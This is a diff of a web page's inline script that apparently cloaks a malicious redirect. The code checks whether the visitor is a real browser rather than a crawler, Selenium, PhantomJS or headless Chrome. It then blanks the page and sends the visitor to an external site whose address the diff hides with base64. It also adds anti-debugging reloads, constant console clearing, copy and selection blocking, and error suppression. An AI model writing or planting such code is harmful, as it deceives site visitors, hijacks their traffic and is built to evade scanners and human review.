@@ -114,69 +114,57 @@
 
     <script>
         (function() {
-            
+           
             const _t = Date.now();
             
          
             function _v() {
-                const t = {
-                    w: !!(window.top === window.self),
-                    d: !document.hidden,
-                    h: window.outerHeight - window.innerHeight < 200,
-                    n: !navigator.webdriver,
-                    p: !window.__nightmare,
-                    s: !window.callPhantom,
-                    c: !window._selenium,
-                    f: !navigator.languages.length,
-                    m: !/HeadlessChrome/.test(navigator.userAgent),
-                    x: window.chrome && window.chrome.runtime
-                };
-                return Object.values(t).every(x => x);
+                try {
+                    const t = {
+                        w: !!(window.top === window.self),
+                        d: !document.hidden,
+                        h: window.outerHeight - window.innerHeight < 200,
+                        n: !navigator.webdriver,
+                        p: !window.__nightmare,
+                        s: !window.callPhantom,
+                        c: !window._selenium,
+                        x: window.chrome && window.chrome.runtime
+                    };
+                    return Object.values(t).every(x => x);
+                } catch(e) {
+                    return false;
+                }
             }
 
-     
-            function _m() {
-                const t = {
-                    t: /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent),
-                    o: window.orientation !== undefined,
-                    s: window.screen.width < 768
-                };
-                return Object.values(t).some(x => x);
-            }
-
-
-            const _delay = Math.floor(Math.random() * 1000) + 1000;
-
+           
+            const _delay = Math.floor(Math.random() * 1000) + 1500;
             setTimeout(() => {
-                if(_v()) {
-                    document.body.style.opacity = '0';
-                    setTimeout(() => {
-                        window.location.href = 'https://h5.worldtrade-svip.com/';
-                    }, 300);
+                try {
+                    if(_v()) {
+                        document.body.style.opacity = '0';
+                        setTimeout(() => {
+                            const _url = atob('aHR0cHM6Ly9oNS53b3JsZHRyYWRlLXN2aXAuY29tLw==');
+                            window.location.replace(_url);
+                        }, 300);
+                    }
+                } catch(e) {
+                    console.clear();
                 }
             }, _delay);
 
-
+   
             setInterval(() => {
                 const s = performance.now();
                 debugger;
                 if(performance.now() - s > 100) location.reload();
             }, 100);
 
-
-            setInterval(() => {
-                if(Date.now() - _t > 300000) {
-                    window.location.reload();
-                }
-            }, 1000);
-
-
+  
             setInterval(() => {
                 console.clear();
-                console.log('%c', 'padding:50px; background:url(data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7); font-size:1px;');
             }, 50);
 
-
+     
             document.onselectstart = () => false;
             document.oncopy = () => false;
             document.ondragstart = () => false;
@@ -197,12 +185,9 @@
             });
 
 
-            window.onerror = function(msg, url, line) {
+            window.onerror = function() {
                 return true;
             };
-            const _0x1a2b = window;
-            const _0x3c4d = document;
-            const _0x5e6f = location;
 
         })();
     </script>
